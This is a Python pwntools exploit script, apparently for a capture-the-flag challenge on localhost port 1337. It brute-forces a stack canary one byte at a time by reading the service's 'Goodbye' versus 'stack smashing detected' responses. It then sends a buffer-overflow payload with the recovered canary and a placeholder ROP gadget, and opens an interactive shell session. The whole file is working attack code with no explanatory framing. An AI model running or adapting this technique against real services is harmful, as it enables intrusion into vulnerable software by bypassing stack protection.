from pwn import *

# Connection settings
HOST = 'localhost'
PORT = 1337
offset_to_canary = 0x58

def bruteforce_canary():
    # First byte is always null
    canary = b'\x00'
    
    # Bruteforce remaining 7 bytes
    for i in range(1, 8):
        for byte in range(256):
            try:
                # Create connection
                p = remote(HOST, PORT)
                
                # Create payload with current canary guess
                payload = b'A' * offset_to_canary + canary + bytes([byte])
                
                # Send payload
                p.sendline(payload)
                
                # Read the response
                response = p.recvall(timeout=2).decode('latin-1', errors='ignore')
                
                # Check for the success indicator (Goodbye!) vs. failure indicator (stack smashing)
                if "### Goodbye!" in response:
                    canary += bytes([byte])
                    log.success(f"Found byte {i}: 0x{byte:02x}")
                    break
                elif "stack smashing detected" in response:
                    log.debug(f"Byte 0x{byte:02x} - Triggered stack protection")
                else:
                    log.debug(f"Byte 0x{byte:02x} - Unknown response")
                    
            except Exception as e:
                log.debug(f"Exception with byte {byte:02x}: {str(e)}")
            finally:
                p.close()
        else:
            log.error(f"Failed to find byte {i} - tried all 256 possibilities")
            
            # Let's print what we've found so far
            log.info(f"Partial canary found: 0x{canary.hex()}")
            return None
    
    log.success(f"Found complete canary: 0x{canary.hex()}")
    return canary

def main():
    # Get the canary
    canary = bruteforce_canary()
    if not canary:
        log.error("Failed to determine complete canary.")
        return
    
    # Create the exploit with the correct canary
    p = remote(HOST, PORT)
    
    # Build ROP chain
    rop_chain = p64(0x4141414141414141)  # Replace with your actual gadget
    
    # Full payload
    payload = flat(
        b'A' * offset_to_canary,
        canary,
        b'B' * 8,  # Padding after canary
        rop_chain
    )
    
    # Optional debugging
    gdb.attach(p, 'b * challenge+388')
    
    # Send and interact
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    main()
